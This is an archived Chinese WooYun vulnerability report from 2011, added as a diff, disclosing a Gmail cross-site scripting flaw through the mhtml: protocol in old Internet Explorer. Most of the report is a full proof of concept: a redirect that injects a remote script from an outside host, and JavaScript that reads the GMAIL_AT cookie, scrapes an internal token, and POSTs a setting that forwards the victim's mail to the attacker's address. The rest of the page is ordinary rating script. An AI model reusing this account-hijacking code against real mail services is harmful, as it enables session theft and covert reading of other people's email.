@@ -1,0 +1,229 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Gmail的XSS一枚  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Gmail的XSS一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Jacks">Jacks</a> 
+</li><li>提交时间：		2011-04-29 17:56</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-04-29：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2011-04-29：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">还是跟mhtml有关.详细请看下面咯。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">已经补掉了...现在放出给大家分享下完整的POC! </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>&lt;script language=&quot;javascript&quot;&gt; <br />
+function detectOS() {<br />
+	     var sUserAgent = navigator.userAgent;<br />
+		 var isWin = (navigator.platform == &quot;Win32&quot;) || (navigator.platform == &quot;Windows&quot;);<br />
+		<br />
+		if (isWin) {<br />
+			var isWin2K = sUserAgent.indexOf(&quot;Windows NT 5.0&quot;) &gt; -1 || sUserAgent.indexOf(&quot;Windows 2000&quot;) &gt; -1;<br />
+			var isWinXP = sUserAgent.indexOf(&quot;Windows NT 5.1&quot;) &gt; -1 || sUserAgent.indexOf(&quot;Windows XP&quot;) &gt; -1;<br />
+			var isWin2003 = sUserAgent.indexOf(&quot;Windows NT 5.2&quot;) &gt; -1 || sUserAgent.indexOf(&quot;Windows 2003&quot;) &gt; -1;<br />
+			if (isWin2K || isWinXP ||isWin2003) document.location=&quot;mhtml:https://mail.google.com/support/bin/answer.py?answer=6576&amp;cbid=-1vw2scem46j8f&amp;src=cb&amp;lev= index&amp;answer=%250AContent-Location:viki%250aContent-Transfer-Encoding:base64%250D250DPHNjcmlwdCBzcmM9aHR0cDovL3d3dy5qYWNrcy5jb20vamFjay5qcz48L3NjcmlwdD4=!viki&quot;;<br />
+			<br />
+			var isWinVista = sUserAgent.indexOf(&quot;Windows NT 6.0&quot;) &gt; -1 || sUserAgent.indexOf(&quot;Windows Vista&quot;) &gt; -1;<br />
+			var isWin7 = sUserAgent.indexOf(&quot;Windows NT 6.1&quot;) &gt; -1 || sUserAgent.indexOf(&quot;Windows 7&quot;) &gt; -1;<br />
+			if (isWin7 || isWinVista ) document.location=&quot;mhtml:https://mail.google.com/support/bin/answer.py?answer=6576&amp;cbid=-1vw2scem46j8f&amp;src=cb&amp;lev= index&amp;answer=%0AContent-Location:viki%0aContent-Transfer-Encoding:base640L0DPHNjcmlwdCBzcmM9aHR0cDovL3d3dy5qYWNrcy5jb20vamFjay5qcz48L3NjcmlwdD4=!viki&quot;;<br />
+		} <br />
+			return &quot;other&quot;; <br />
+}<br />
+ <br />
+detectOS();<br />
+ <br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+Content-Transfer-Encoding:后的需要base64编码.调用一个js.<br />
+<br />
+</p><pre><code>&lt;script src=http://www.jacks.com/jack.js&gt;&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+JS代码如下：<br />
+<br />
+</p><pre><code>document.write(&#039;&lt;iframe id=ifr width=0 height=0 onload=&quot;crosscookie()&quot; src=&quot;http://mail.google.com/mail/x/&quot;&gt;&lt;/iframe&gt;&lt;img src=&quot;http://www.spypig.com/67fcfa37-4240-11e0-8986-00188be7649a/pig.gif&quot; width=0&gt;&#039;);<br />
+<br />
+function crosscookie(){<br />
+	var KEY = &#039;GMAIL_AT&#039;;<br />
+	var MAIL = &#039;jacks@gmail.com&#039;<br />
+	ifr = ifr.contentWindow ? ifr.contentWindow : ifr.contentDocument;<br />
+	var cookies = ifr.document.cookie.split(/\s*;\s*/);<br />
+	var GMAIL_AT;<br />
+	var IK;<br />
+	for(var i = 0, len = cookies.length; i &lt; len; i++){<br />
+		var arr = cookies[i].split(/\s*=\s*/);<br />
+		if(arr[0] == KEY) {<br />
+			GMAIL_AT = arr[1];<br />
+   <br />
+		}<br />
+	}<br />
+<br />
+	var xhr = new ifr.ActiveXObject(&#039;Microsoft.XMLHttp&#039;);<br />
+	xhr.open(&#039;GET&#039;, &#039;https://mail.google.com/mail/&#039;, false);<br />
+	xhr.send();<br />
+	var source = xhr.responseText;<br />
+	var reg = /GLOBALS=\[/;<br />
+	var result = reg.exec(source);<br />
+	var pos = result.index + (result + &#039;&#039;).length;<br />
+	var len = source.length;<br />
+	var l = 1;<br />
+	var start = pos;<br />
+	while(pos &lt; len){<br />
+		var c = source.charAt(pos);<br />
+		if(c === &#039;[&#039;) {<br />
+			l++;<br />
+		} else if(c === &#039;]&#039;){<br />
+			l--;<br />
+		}<br />
+		if(l === 0) break;<br />
+		pos++;<br />
+	}<br />
+	IK = eval(&#039;[&#039; + source.substring(start, pos) + &#039;]&#039;)[9];<br />
+	xhr.open(&#039;POST&#039;, &#039;https://mail.google.com/mail/?ui=2&amp;ik=&#039; + IK + &#039;&amp;view=mdlg&amp;at=&#039; + GMAIL_AT, false);<br />
+	xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;)<br />
+	xhr.send(&#039;mdrp=1&amp;mda=&#039; + MAIL);<br />
+	 document.location=&quot;http://www.xxxx.com/images/scan.jpg&quot;;<br />
+	//window.close();<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+能做什么就不用我多说了把？ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">官方已经修复了,放出来,研究mail xss的人看吧!这类东西某些部门还是非常喜欢的!<br />
+<br />
+还是mhtml问题哈~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Jacks" title="Jacks">Jacks</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02011" title="Gmail的XSS一枚">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：10 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2011";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
